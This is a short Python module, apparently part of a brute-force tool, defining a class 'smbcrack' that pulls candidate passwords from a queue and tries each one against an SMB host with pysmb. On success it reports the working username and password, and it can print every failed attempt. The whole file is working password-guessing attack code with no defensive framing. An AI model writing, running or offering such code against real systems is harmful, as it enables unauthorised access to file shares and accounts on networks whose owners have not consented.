'''
module : pysmb
s=SMBConnection.SMBConnection(username,passwd,'','')
s.connect(self.op.host) return True | false

'''


import time
from smb import SMBConnection

class smbcrack:
    def __init__(self,op,args):
        self.op=op
        self.args=args

    def run(self,inputq,outputq,username):
        while True:
            try:
                passwd=inputq.get(timeout=1)
            except:
                outputq.put(1)
                time.sleep(0.5)
                exit(1)


            s=SMBConnection.SMBConnection(username,passwd,'','')
            if s.connect(self.op.host)==True:
                outputq.put((username,passwd))
                time.sleep(0.5)
                exit(1)
            else:
                if self.op.verbose!=None:
                    e='login incorrect'
                    print("%s ----- (Username:%s  Passwd:%s)" %(e,username,passwd))
                else:
                    print("Username:%s  Passwd:%s:" % (username, passwd))